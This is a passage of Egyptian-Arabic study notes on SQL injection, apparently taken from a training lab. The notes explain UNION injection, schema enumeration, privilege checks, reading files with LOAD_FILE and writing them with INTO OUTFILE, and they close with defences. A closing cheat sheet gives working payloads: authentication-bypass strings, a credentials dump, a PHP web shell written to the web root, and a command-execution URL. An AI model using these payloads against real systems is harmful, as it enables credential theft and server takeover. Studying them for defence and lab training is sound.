2

3

4
```

---

فتبقى النتيجة:

|col1|col2|col3|col4|
|---|---|---|---|
|admin|2|3|4|

---

هنا:

```
admin
```

هي البيانات المهمة.

أما:

```
2
3
4
```

مجرد حشو.

---

# ليه بيستخدموا أرقام؟

الشرح قال:

علشان يبقى سهل يعرف كل رقم ظاهر في أنهي عمود.

مثلاً:

```
1
2
3
4
```

لو الصفحة عرضت:

```
3
```

يبقى عرف إن العمود الثالث هو اللي بيتعرض للمستخدم.

---

وده بيساعد الباحث الأمني يفهم شكل الاستعلام أثناء الاختبار المصرح به.

---

# NULL

الشرح قال إن المتقدمين غالبًا بيستخدموا:

```sql
NULL
```

بدل الأرقام.

---

يعني:

```
username

NULL

NULL

NULL
```

---

ليه؟

لأن:

```
NULL
```

بيتوافق مع معظم أنواع البيانات.

سواء Integer أو String أو Date.

فبيقلل احتمال ظهور Error بسبب اختلاف نوع البيانات.

---

# ملخص الجزء

- **UNION** عبارة عن Clause في SQL وظيفتها دمج نتائج أكثر من استعلام `SELECT` في جدول واحد.
    
- أهم شرط لاستخدام UNION هو أن **عدد الأعمدة في كل SELECT يكون متساويًا**.
    
- يفضل أيضًا أن تكون **أنواع البيانات في الأعمدة المتناظرة متوافقة**.
    
- لو احتجت تكمل عدد الأعمدة، ممكن تستخدم قيم ثابتة أو `NULL` كحشو (Placeholder) علشان يظل شكل النتيجة متوافقًا.
    
- في تطبيقات الويب غير المؤمنة، سوء استخدام UNION مع مدخلات المستخدم قد يؤدي إلى ثغرات **Union-Based SQL Injection**، ولذلك يُنصح دائمًا باستخدام **Prepared Statements** والتحقق من المدخلات بدل دمجها مباشرة داخل الاستعلامات.

# Layer 8
الجزء ده يعتبر من أهم أجزاء فهم SQL، لأنه بيشرح إزاي قاعدة البيانات بتنظم المعلومات بتاعتها، وإزاي المطور يقدر يعرف أسماء الـ Databases والـ Tables والـ Columns. وفي سياق أمن المعلومات، فهم الهيكل ده بيساعد الباحث الأمني يعرف ليه ثغرات SQL Injection خطيرة. هشرحه بالمصري بالتفصيل.

---

# Database Enumeration

كلمة:

```text
Enumeration
```

معناها:

**جمع معلومات أو استكشاف مكونات النظام.**

يعني بدل ما تشتغل وأنت مش عارف حاجة، تبدأ تعرف:

- إيه قواعد البيانات الموجودة؟
    
- إيه الجداول الموجودة؟
    
- إيه الأعمدة الموجودة؟
    
- إيه البيانات اللي كل جدول بيخزنها؟
    

دي كلها اسمها Enumeration.

---

# MySQL Fingerprinting

## يعني إيه Fingerprinting؟

الكلمة معناها:

**تحديد هوية الحاجة اللي قدامك.**

زي البصمة كده.

قبل ما تتعامل مع قاعدة البيانات لازم تعرف:

هي MySQL؟  
ولا PostgreSQL؟  
ولا Oracle؟  
ولا SQL Server؟

لأن كل واحدة ليها أوامر مختلفة شوية.

---

الشرح بيقول إن ساعات تقدر تخمن نوع قاعدة البيانات من نوع الـ Web Server.

مثلاً:

لو السيرفر:

```text
Apache
```

أو

```text
Nginx
```

غالبًا شغال على Linux.

وساعات بيستخدم MySQL أو MariaDB.

---

ولو السيرفر:

```text
IIS
```

غالبًا بيكون شغال على Windows.

وساعات بيستخدم Microsoft SQL Server.

---

لكن دي مجرد تخمينات.

مش قاعدة ثابتة.

---

# @@version

في MySQL فيه متغير اسمه:

```sql
@@version
```

بيحتوي على إصدار قاعدة البيانات.

مثلاً:

```
10.3.22-MariaDB-1ubuntu1
```

يعني:

- الإصدار 10.3.22
    
- قاعدة البيانات MariaDB
    
- نسخة Ubuntu
    

---

# MariaDB

MariaDB عبارة عن نسخة مفتوحة المصدر متوافقة مع MySQL.

يعني معظم أوامر MySQL شغالة عليها.

علشان كده ناس كتير بتعتبرهم قريبين جدًا.

---

# INFORMATION_SCHEMA Database

دي من أهم قواعد البيانات في MySQL.

اسمها:

```text
INFORMATION_SCHEMA
```

---

دي مش بتخزن بيانات المستخدمين.

ولا المنتجات.

ولا الطلبات.

---

دي بتخزن:

**معلومات عن قواعد البيانات نفسها.**

يعني Metadata.

---

# يعني إيه Metadata؟

يعني:

**بيانات عن البيانات.**

مثال:

بدل ما الجدول يخزن أسماء الموظفين.

هو يخزن:

- اسم الجدول
    
- عدد الأعمدة
    
- أسماء الأعمدة
    
- نوع كل عمود
    

يعني معلومات عن الجداول نفسها.

---

# ليه INFORMATION_SCHEMA مهمة؟

لأنها تعتبر دليل (Directory) لكل قواعد البيانات الموجودة على السيرفر.

تقدر تعرف منها:

- أسماء الـ Databases
    
- أسماء الـ Tables
    
- أسماء الـ Columns
    
- أنواع البيانات
    

---

# Dot Operator

الشرح قال:

```sql
my_database.users
```

فيه نقطة.

اسمها:

```text
Dot Operator
```

---

يعني:

```
اسم قاعدة البيانات
.

اسم الجدول
```

---

مثلاً:

```sql
school.students
```

يعني:

جدول students الموجود داخل قاعدة بيانات school.

---

# SCHEMATA

داخل INFORMATION_SCHEMA فيه جدول اسمه:

```text
SCHEMATA
```

---

وده بيحتوي على:

كل أسماء قواعد البيانات الموجودة على السيرفر.

---

وفيه عمود اسمه:

```text
SCHEMA_NAME
```

وده بيحتوي على اسم كل Database.

---

مثلاً:

|SCHEMA_NAME|
|---|
|mysql|
|information_schema|
|performance_schema|
|ilfreight|
|dev|

---

يبقى عندنا خمس قواعد بيانات.

---

# قواعد البيانات الافتراضية

الشرح قال:

```
mysql
information_schema
performance_schema
```

دول بييجوا مع MySQL تلقائي.

وساعات كمان:

```
sys
```

---

دول قواعد بيانات خاصة بالنظام نفسه.

ومش بيبقوا مهمين بالنسبة لبيانات التطبيق.

---

يبقى غالبًا اللي يهم المطور أو الباحث الأمني:

```
ilfreight
dev
```

---

# Current Database

فيه دالة في MySQL اسمها:

```sql
database()
```

---

وظيفتها:

ترجع اسم قاعدة البيانات الحالية اللي التطبيق شغال عليها.

مثلاً:

```
ilfreight
```

يعني التطبيق بيقرأ بياناته من قاعدة البيانات دي.

---

# TABLES

بعد ما عرفنا اسم قاعدة البيانات.

نحتاج نعرف الجداول اللي جواها.

---

داخل INFORMATION_SCHEMA فيه جدول اسمه:

```text
TABLES
```

---

الجدول ده بيحتوي على معلومات عن كل الجداول الموجودة.

---

ومن أهم الأعمدة:

```
TABLE_NAME
```

اسم الجدول.

و

```
TABLE_SCHEMA
```

اسم قاعدة البيانات اللي الجدول موجود فيها.

---

مثلاً:

|TABLE_NAME|TABLE_SCHEMA|
|---|---|
|credentials|dev|
|posts|dev|
|pages|dev|
|framework|dev|

---

يعني قاعدة البيانات dev فيها أربع جداول.

---

# WHERE table_schema='dev'

الشرح كتب شرط:

```sql
WHERE table_schema='dev'
```

---

يعني:

هات الجداول اللي موجودة داخل قاعدة بيانات dev فقط.

---

لو مش كتبناه.

هيجيب جداول كل قواعد البيانات الموجودة.

وده ممكن يبقى عدد ضخم جدًا.

---

# credentials

في المثال فيه جدول اسمه:

```
credentials
```

---

اسمه يوحي إنه بيخزن:

بيانات تسجيل الدخول.

زي:

- Username
    
- Password
    
- API Keys
    

---

وده مجرد اسم.

لكن لازم نعرف الأعمدة اللي جواه.

---

# COLUMNS

علشان نعرف أعمدة أي جدول.

في INFORMATION_SCHEMA فيه جدول اسمه:

```text
COLUMNS
```

---

وده بيحتوي على معلومات عن كل الأعمدة الموجودة في كل الجداول.

---

ومن أهم الأعمدة فيه:

```
COLUMN_NAME
```

اسم العمود.

---

```
TABLE_NAME
```

اسم الجدول.

---

```
TABLE_SCHEMA
```

اسم قاعدة البيانات.

---

مثلاً:

|COLUMN_NAME|TABLE_NAME|TABLE_SCHEMA|
|---|---|---|
|username|credentials|dev|
|password|credentials|dev|

---

يبقى جدول credentials فيه عمودين:

```
username
password
```

---

# Data

بعد ما عرفنا:

- اسم قاعدة البيانات
    
- اسم الجدول
    
- أسماء الأعمدة
    

يبقى المطور يقدر يكتب استعلام SQL عادي يقرأ البيانات المطلوبة من الجدول، لأن عنده كل أسماء العناصر اللازمة.

---

# ليه INFORMATION_SCHEMA مهمة؟

لأنها تعتبر:

**خريطة كاملة لقاعدة البيانات.**

من خلالها تقدر تعرف:

```
Database
    ↓

Tables
    ↓

Columns
    ↓

Data
```

يعني:

```
قواعد البيانات
        ↓

الجداول
        ↓

الأعمدة
        ↓

القيم المخزنة
```

---

# ملخص الجزء

- **Fingerprinting** يعني تحديد نوع قاعدة البيانات وإصدارها.
    
- **INFORMATION_SCHEMA** قاعدة بيانات خاصة بالنظام، بتخزن معلومات عن كل قواعد البيانات والجداول والأعمدة الموجودة على السيرفر.
    
- **SCHEMATA** جدول بيحتوي على أسماء جميع قواعد البيانات.
    
- **TABLES** جدول بيحتوي على أسماء الجداول الموجودة داخل كل قاعدة بيانات.
    
- **COLUMNS** جدول بيحتوي على أسماء الأعمدة الخاصة بكل جدول.
    
- الـ **Dot Operator (`database.table`)** بيستخدم للإشارة إلى جدول موجود داخل قاعدة بيانات معينة.
    
- فكرة **Database Enumeration** هي فهم هيكل قاعدة البيانات (Databases → Tables → Columns) قبل التعامل مع البيانات نفسها، وده مفيد للمطورين ومدققي الأمن لفهم البنية الداخلية وحماية التطبيقات من ثغرات SQL Injection.

------
# Layer 
تمام يا مهاب، الجزء ده مهم جدًا لأنه بيورّيك إزاي SQL Injection ممكن تعدي من مجرد قراءة بيانات لمرحلة أخطر وهي قراءة ملفات من السيرفر نفسه. هشرح كل سطر وفكرة بالتفصيل، لكن بشكل تعليمي لفهم الثغرة وتأثيرها، مش كخطوات استغلال عملية.

# أولًا: ليه قراءة الملفات مهمة؟

لحد دلوقتي كنا بنجيب بيانات من قاعدة البيانات نفسها:

- يوزرات
    
- باسوردات
    
- جداول
    
- قواعد بيانات
    

لكن أحيانًا المهاجم بيكون عايز حاجة مش موجودة في الداتابيز أصلًا، زي:

- ملفات إعدادات الموقع
    
- سورس كود PHP
    
- ملفات النظام
    
- ملفات فيها كلمات مرور أو API Keys
    

لو قاعدة البيانات عندها صلاحيات معينة، ممكن تقرأ ملفات من نظام التشغيل نفسه.

---

# Privileges (الصلاحيات)

مش أي يوزر في قاعدة البيانات يقدر يقرأ ملفات.

كل يوزر في MySQL بيكون ليه مجموعة صلاحيات.

زي بالضبط:

- موظف عادي
    
- مدير
    
- Admin
    

كل واحد ليه صلاحيات مختلفة.

عشان كده قبل ما نفكر نقرأ ملفات لازم نعرف:

1. إحنا مين جوه قاعدة البيانات؟
    
2. عندنا صلاحيات إيه؟
    

---

# DB User

## يعني إيه DB User؟

لما الموقع بيتصل بقاعدة البيانات بيستخدم يوزر معين.

مثال:

```php
$conn = new mysqli("localhost","root","password","users");
```

هنا الموقع متصل باستخدام:

```sql
root
```

فكل الأوامر هتتنفذ بصلاحيات root.

---

## إزاي نعرف اليوزر الحالي؟

في MySQL فيه دوال بتجيب اليوزر الحالي.

زي:

```sql
SELECT USER()
```

أو

```sql
SELECT CURRENT_USER()
```

لو رجعت:

```sql
root@localhost
```

يبقى الموقع شغال بيوزر root.

![[Pasted image 20260621164059.png]]


---

## ليه root مهم؟

لأن root غالبًا:

- DBA
    

يعني:

Database Administrator

وده أعلى مستوى صلاحيات في قاعدة البيانات.

غالبًا يقدر:

- يقرأ كل الجداول
    
- يعدل كل الجداول
    
- ينشئ قواعد بيانات
    
- يحذف قواعد بيانات
    
- يقرأ ملفات
    
![[Pasted image 20260621164038.png]]

---

# User Privileges

بعد ما عرفنا اليوزر الحالي، لازم نعرف صلاحياته.

---

## SUPER PRIV

في MySQL فيه صلاحية اسمها:

```sql
SUPER
```

دي صلاحية قوية جدًا.

لو قيمتها:

```sql
Y
```

يعني:

```text
Yes
```

عنده صلاحيات إدارية كبيرة.
![[Pasted image 20260621164204.png]]

---

## information_schema.user_privileges

فاكر INFORMATION_SCHEMA؟

دي قاعدة البيانات اللي فيها معلومات عن قواعد البيانات كلها.

فيها جدول اسمه:

```sql
user_privileges
```

بيخزن صلاحيات كل يوزر.

مثال:

| user | privilege |
| ---- | --------- |
| root | SELECT    |
| root | INSERT    |
| root | UPDATE    |
| root | FILE      |
`http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`

---

# FILE Privilege

دي أهم نقطة في الجزء كله.

لو لقيت:

```text
FILE
```

ضمن الصلاحيات

يبقى اليوزر يقدر يتعامل مع ملفات النظام.

يعني ممكن:

- يقرأ ملفات
    
- أحيانًا يكتب ملفات
    

---

# LOAD_FILE()

دي دالة موجودة في MySQL.

وظيفتها:

```sql
LOAD_FILE(path)
```

بتقرأ ملف من الجهاز وترجع محتواه.

مثال:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

````
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
````

---

# إيه هو /etc/passwd ؟

في أنظمة لينكس فيه ملف مشهور جدًا:

```text
/etc/passwd
```

بيحتوي معلومات عن مستخدمي النظام.

مثال:

```text
root:x:0:0:root:/root:/bin/bash
```

السطر ده معناه:

- اسم المستخدم = root
    
- UID = 0
    
- Home Directory = /root
    
- Shell = /bin/bash
    

---

# هل أي ملف يتقري؟

لأ.

في شرط مهم جدًا.

## لازم MySQL نفسه يقدر يقرأ الملف

يعني لو خدمة MySQL شغالة تحت مستخدم:

```text
mysql
```

والمستخدم ده ملوش صلاحية على الملف

هتلاقي:

```sql
LOAD_FILE()
```

رجعت:

```sql
NULL
```

---

# شروط نجاح LOAD_FILE

لازم:

## 1) يكون عندك FILE privilege

يعني اليوزر في قاعدة البيانات عنده FILE.

---

## 2) الملف موجود

لو الملف مش موجود:

```sql
NULL
```

---

## 3) MySQL يقدر يقرأ الملف

لو نظام التشغيل مانع القراءة:

```sql
NULL
```

---

# قراءة ملفات الموقع

الموضوع بيبقى أخطر لما نقرأ ملفات الموقع نفسه.

مثال:

```text
search.php
```

---

## ليه ده خطير؟

لأن سورس الكود ممكن يحتوي على:

- كلمات مرور قاعدة البيانات
    
- API Keys
    
- Tokens
    
- Secrets
    

مثال:

```php
$db_user="root";
$db_pass="supersecret";
```

لو شفت السطر ده يبقى عرفت بيانات الاتصال بقاعدة البيانات.

---

# Web Root

لازم نعرف ملفات الموقع موجودة فين.

في Apache غالبًا:

```text
/var/www/html
```

---

مثال:

```text
/var/www/html/search.php
```

---

# ماذا يحدث عند قراءة ملف PHP؟

في الطبيعي لما تفتح:

```text
search.php
```

المتصفح بيشوف النتيجة النهائية فقط.

يعني PHP بيتنفذ على السيرفر.

---

لكن لو قرأته كملف من خلال قاعدة البيانات:

```sql
LOAD_FILE(...)
```

ساعتها هتشوف:

```php
<?php
$conn = new mysqli(...);
...
?>
```

يعني السورس كود نفسه.

---

# ليه السورس كود مهم؟

لأنه ممكن يكشف:

## 1) Database Credentials

```php
$username="root";
$password="123456";
```

---

## 2) API Keys

```php
$api_key="ABC123";
```

---

## 3) Hidden Endpoints

مثال:

```php
/admin
/debug
/internal
```

---

## 4) ثغرات إضافية

زي:

- SQL Injection تانية
    
- File Inclusion
    
- Command Injection
    

---

# تسلسل الهجوم كامل

المهاجم غالبًا بيمشي بالشكل ده:

### 1. يكتشف SQL Injection

↓

### 2. يعرف عدد الأعمدة

↓

### 3. يعمل UNION Injection

↓

### 4. يعرف قواعد البيانات

من:

```sql
INFORMATION_SCHEMA.SCHEMATA
```

↓

### 5. يعرف الجداول

من:

```sql
INFORMATION_SCHEMA.TABLES
```

↓

### 6. يعرف الأعمدة

من:

```sql
INFORMATION_SCHEMA.COLUMNS
```

↓

### 7. يسحب البيانات الحساسة

↓

### 8. يعرف اليوزر الحالي

↓

### 9. يعرف الصلاحيات

↓

### 10. لو عنده FILE Privilege

يبدأ يقرأ ملفات النظام أو ملفات الموقع.

---

# الخلاصة

الفصل ده بيشرح إن SQL Injection مش هدفها بس سرقة بيانات من الجداول.

لو حساب قاعدة البيانات عنده صلاحيات عالية (خصوصًا FILE privilege)، ممكن تتحول الثغرة من:

```text
Database Compromise
```

إلى:

```text
Server Compromise
```

لأن المهاجم يقدر يقرأ ملفات حساسة من السيرفر، ويجمع معلومات أكتر عن التطبيق والبنية التحتية، وده أحيانًا بيكون خطوة أولى للوصول لسيطرة أكبر على النظام.

----
# Layer

تمام، الجزء ده يعتبر أخطر مرحلة في رحلة SQL Injection، لأننا بننتقل من:

- قراءة بيانات من قاعدة البيانات
    
- قراءة ملفات من السيرفر
    

إلى مرحلة أخطر وهي:

- كتابة ملفات على السيرفر
    

ولو المهاجم قدر يكتب ملف قابل للتنفيذ، ساعتها ممكن يوصل لتنفيذ أوامر على السيرفر نفسه.

عشان كده معظم قواعد البيانات الحديثة بقت مقفلة الموضوع ده بشكل افتراضي.

---

# الفرق بين Reading Files و Writing Files

في الجزء اللي فات كنا بنتكلم عن:

```text
LOAD_FILE()
```

وده بيقرأ ملفات موجودة بالفعل.

مثال:

- قراءة ملف إعدادات
    
- قراءة سورس كود الموقع
    
- قراءة ملفات النظام
    

أما هنا فإحنا بنتكلم عن العكس:

```text
إنشاء ملف جديد
أو
كتابة محتوى داخل ملف
```

وده أخطر بكتير.

---

# ليه كتابة الملفات خطيرة؟

تخيل إن المهاجم قدر يكتب ملف داخل مجلد الموقع.

بدل ما يكتب:

```text
hello world
```

ممكن يكتب:

```php
كود PHP
```

ولما الزائر يفتح الملف من المتصفح، الكود يشتغل على السيرفر.

عشان كده كتابة الملفات تعتبر خطوة كبيرة جدًا في أي اختراق.

---

# شروط كتابة الملفات

النص بيقول إن فيه 3 شروط لازم يتحققوا.

## الشرط الأول: FILE Privilege

لازم اليوزر المستخدم في قاعدة البيانات يكون عنده صلاحية:

```sql
FILE
```

فاكر لما كنا بنجيب الصلاحيات من:

```sql
information_schema.user_privileges
```

لو لقينا:

```text
FILE
```

يبقى أول شرط اتحقق.

---

## الشرط الثاني: secure_file_priv

ودي نقطة مهمة جدًا.

MySQL فيها متغير اسمه:

```sql
secure_file_priv
```

المتغير ده مسؤول عن تحديد:

```text
إيه الأماكن المسموح القراءة والكتابة فيها
```

---

# الحالات الممكنة للمتغير

## الحالة الأولى: فارغ

مثال:

(قيمة فاضية)

معناها:

```text
مسموح القراءة والكتابة في أي مكان
```

ودي أخطر حالة.
![[Pasted image 20260621170750.png]]

---

## الحالة الثانية: مسار محدد

مثال:

```text
/var/lib/mysql-files/
```

معناها:

```text
ممنوع الكتابة خارج المجلد ده
```

يعني حتى لو عندك صلاحية FILE مش هتعرف تكتب برا المكان المحدد.

---

## الحالة الثالثة: NULL

لو القيمة:

```text
NULL
```

يبقى:

```text
القراءة والكتابة مقفولة بالكامل
```

ودي أكثر إعدادات أمانًا.

---

# ليه المتغير ده اتعمل؟

زمان كان أي DBA عنده FILE privilege يقدر يقرأ ويكتب في أي مكان.

الموضوع كان خطير جدًا.

عشان كده MySQL الحديثة بدأت تقيد الأماكن المسموح التعامل معاها.

---

# الشرط الثالث: صلاحيات نظام التشغيل

حتى لو:

- عندك FILE privilege
    
- secure_file_priv سامح
    

لسه فيه شرط.

لازم مستخدم MySQL نفسه يكون قادر يكتب في المجلد.

مثال:

لو MySQL شغال بالمستخدم:

```text
mysql
```

والمجلد:

```text
/root
```

مقفول عليه

فالكتابة هتفشل.

---

# SELECT INTO OUTFILE

دي الجملة المسؤولة عن كتابة الملفات.

فكرتها بسيطة جدًا.

بدل ما نتيجة الاستعلام تظهر على الشاشة،

تتحفظ داخل ملف.

---

مثال بسيط:

عندك جدول فيه بيانات موظفين.

بدل ما تشوف البيانات:

```text
Ahmed
Ali
Mona
```

على الشاشة،

تتخزن في ملف.

---

# ليه اتعملت أصلًا؟

الغرض الأصلي منها:

```text
Export Data
```

يعني تصدير البيانات.

شركة عندها مليون سجل.

تحب تطلعهم ملف.

فتستخدم:

```text
SELECT INTO OUTFILE
```

---

# ماذا يحدث فعليًا؟

قاعدة البيانات:

1. تنفذ الاستعلام
    
2. تجيب النتائج
    
3. تكتب النتائج داخل الملف
    

---

# كتابة نصوص مباشرة

مش شرط تكتب بيانات من جدول.

ممكن تكتب نص عادي.

مثال:

```text
Hello World
```

في ملف جديد.

فبالتالي قاعدة البيانات تتحول لأداة لإنشاء ملفات.

---

# لماذا يعتبر هذا خطيرًا؟

لأن قاعدة البيانات لا تفرق بين:

```text
ملف نصي
```

أو

```text
ملف PHP
```

أو

```text
ملف Config
```

هي فقط تكتب البيانات المطلوبة.

---

# Web Root

النص ذكر مصطلح مهم:

```text
Web Root
```

يعني:

المجلد الرئيسي للموقع.

مثال شائع في Apache:

```text
/var/www/html
```

أي ملف يتحط هناك غالبًا يقدر المتصفح يوصله.

---

# إثبات وجود صلاحية الكتابة

أول خطوة عادة تكون:

كتابة ملف نصي بسيط.

الهدف مش الاختراق.

الهدف التأكد فقط:

```text
هل أقدر أكتب في المجلد ده؟
```

ولا لأ.
![[Pasted image 20260621171114.png]]
![[Pasted image 20260621171123.png]]

---

# لو الملف ظهر؟

يبقى:

- FILE privilege موجود
    
- secure_file_priv مش مانع
    
- المجلد قابل للكتابة
    

يعني الشروط كلها متحققة.

---

# Web Shell (شرح مفهومي)

النص بعد كده بيتكلم عن:

```text
Web Shell
```

وده ملف صغير بيتحط على الموقع.

وظيفته:

استقبال طلب من المتصفح ثم تنفيذ شيء على السيرفر.

---

# ليه يعتبر خطير؟

لأن المهاجم ساعتها بيكون خرج من مرحلة:

```text
Database Access
```

إلى:

```text
Server Access
```

يعني بدل ما يتحكم في قاعدة البيانات فقط،

بقى عنده قدرة على التأثير في السيرفر نفسه.

---

# Remote Code Execution (RCE)

دي المرحلة النهائية تقريبًا.

RCE معناها:

```text
Remote Code Execution
```

أي:

تنفيذ أوامر على السيرفر من مكان بعيد.

---

# لماذا يعتبر RCE من أخطر الثغرات؟

لأن المهاجم قد يصبح قادرًا على:

- قراءة الملفات
    
- تعديل الملفات
    
- الوصول لبيانات إضافية
    
- التحرك داخل الشبكة
    

ولهذا السبب تعتبر ثغرات الكتابة على السيرفر من أعلى مستويات الخطورة.
![[Pasted image 20260621171317.png]]

---

# الخلاصة

الجزء ده بيشرح إن استغلال SQL Injection ممكن يتطور بالشكل التالي:

```text
SQL Injection
        ↓
قراءة بيانات من الجداول
        ↓
قراءة ملفات من السيرفر
        ↓
التحقق من الصلاحيات
        ↓
إمكانية كتابة ملفات
        ↓
التأثير على ملفات الموقع
        ↓
الوصول لمرحلة تنفيذ كود على السيرفر
```

وعشان كده أي حساب قاعدة بيانات مستخدم بواسطة الموقع لازم يشتغل بمبدأ:

```text
Least Privilege
```

يعني أقل صلاحيات ممكنة، ومايبقاش عنده FILE privilege إلا لو فيه سبب ضروري جدًا لذلك.


--------------------------------------


# 1. إيه هي SQL Injection؟

بتحصل لما التطبيق ياخد Input من المستخدم ويحطه جوه SQL Query مباشرة من غير حماية.

مثال:

```php
$username = $_POST['username'];

$query = "SELECT * FROM users WHERE username='$username'";
```

لو المستخدم كتب:

```sql
admin' OR '1'='1
```

الـ Query هتبقى:

```sql
SELECT * FROM users
WHERE username='admin' OR '1'='1'
```

وبكده الشرط بقى True دائمًا.

---

# 2. Authentication Bypass

بدل ما أعرف الباسورد الحقيقي أغير منطق الـ Query.

مثال:

```sql
' OR '1'='1
```

أو

```sql
admin'-- -
```

الـ Comment بيخلي باقي الـ Query يتشال.

مثال:

```sql
SELECT * FROM users
WHERE username='admin'-- -
AND password='anything'
```

الجزء الخاص بالباسورد مش بيتنفذ أصلًا.

---

# 3. UNION Injection

بعد ما اكتشفت إن الموقع Vulnerable أبدأ أجيب بيانات من جداول تانية.

مثال:

```sql
UNION SELECT username,password
FROM users
```

لكن لازم:

### نفس عدد الأعمدة

لو الصفحة الأصلية:

```sql
SELECT a,b,c,d
```

يبقى لازم:

```sql
UNION SELECT 1,2,3,4
```

أولًا أعرف عدد الأعمدة.

---

# 4. Finding Number of Columns

إما:

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

لحد ما Error يظهر.

أو:

```sql
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
```

لحد ما يشتغل.

---

# 5. Finding Visible Columns

بعد معرفة عدد الأعمدة:

```sql
UNION SELECT 1,2,3,4
```

أشوف أي أرقام بتظهر في الصفحة.

مثلاً لو ظهر:

```text
2
3
```

يبقى العمودين 2 و 3 ظاهرين للمستخدم.

---

# 6. Database Enumeration

## معرفة نسخة قاعدة البيانات

```sql
SELECT @@version
```

---

## معرفة قاعدة البيانات الحالية

```sql
SELECT database()
```

---

## معرفة المستخدم الحالي

```sql
SELECT user()
```

---

# 7. INFORMATION_SCHEMA

دي قاعدة بيانات فيها Metadata عن كل حاجة.

---

## معرفة كل الـ Databases

```sql
SELECT schema_name
FROM information_schema.schemata
```

---

## معرفة الجداول

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema='dev'
```

---

## معرفة الأعمدة

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='credentials'
```

---

## استخراج البيانات

بعد معرفة:

- Database = dev
    
- Table = credentials
    
- Columns = username,password
    

نجيب البيانات:

```sql
SELECT username,password
FROM dev.credentials
```

أو داخل UNION:

```sql
UNION SELECT
1,
username,
password,
4
FROM dev.credentials
```

---

# 8. Privilege Enumeration

معرفة صلاحيات المستخدم.

### المستخدم الحالي

```sql
SELECT user()
```

---

### Super Privilege

```sql
SELECT super_priv
FROM mysql.user
```

---

### كل الصلاحيات

```sql
SELECT privilege_type
FROM information_schema.user_privileges
```

---

# 9. Reading Files

لو عندك:

```text
FILE Privilege
```

تقدر تقرأ ملفات من السيرفر.

باستخدام:

```sql
LOAD_FILE('/etc/passwd')
```

أو:

```sql
LOAD_FILE('/var/www/html/index.php')
```

وده خطير جدًا لأنه ممكن يطلع:

- Source Code
    
- كلمات مرور
    
- API Keys
    
- Database Credentials
    

---

# 10. Writing Files

عشان تكتب ملفات محتاج:

### FILE privilege

و

### secure_file_priv يسمح

---

تكتب ملف عادي:

```sql
SELECT 'Hello'
INTO OUTFILE '/tmp/test.txt'
```

---

# 11. Web Shell

لو عرفت تكتب داخل Web Root:

```php
<?php system($_REQUEST[0]); ?>
```

وتحفظها:

```sql
INTO OUTFILE '/var/www/html/shell.php'
```

هتبقى قادر تنفذ أوامر على السيرفر.

---

# 12. Remote Code Execution (RCE)

بعد إنشاء:

```php
shell.php
```

تفتح:

```text
http://target/shell.php?0=id
```

فتنفذ:

```bash
id
```

وبكده SQL Injection تحولت إلى:

```text
SQLi → File Write → Web Shell → RCE
```

وده يعتبر من أخطر السيناريوهات.

---

# 13. طرق الحماية

## 1) Parameterized Queries (الأفضل)

بدل:

```php
$query =
"SELECT * FROM users
WHERE username='$user'";
```

نستخدم:

```php
$stmt =
mysqli_prepare(
$conn,
"SELECT * FROM users
WHERE username=?"
);
```

ودي أقوى حماية.

---

## 2) Input Validation

مثال:

```php
preg_match(
"/^[A-Za-z]+$/",
$input
);
```

---

## 3) Escaping

```php
mysqli_real_escape_string()
```

---

## 4) Least Privilege

مستخدم التطبيق يكون:

```sql
SELECT ONLY
```

وليس:

```sql
FILE
SUPER
CREATE
DROP
```

---

## 5) WAF

زي:

- ModSecurity
    
- [Cloudflare](https://www.cloudflare.com/?utm_source=chatgpt.com)
    

بيمنعوا كثير من هجمات SQLi قبل وصولها للتطبيق.

---

## الخلاصة النهائية

سلسلة الاستغلال الكاملة غالبًا تكون:

```text
1. اكتشاف SQL Injection
          ↓
2. Authentication Bypass
          ↓
3. UNION Injection
          ↓
4. Database Enumeration
          ↓
5. Dump Sensitive Data
          ↓
6. Check Privileges
          ↓
7. Read Files
          ↓
8. Write Files
          ↓
9. Upload Web Shell
          ↓
10. Remote Code Execution
```

وده بالضبط الـ Workflow اللي هتقابله في أغلب لابات SQL Injection في HTB و PortSwigger و CTFs.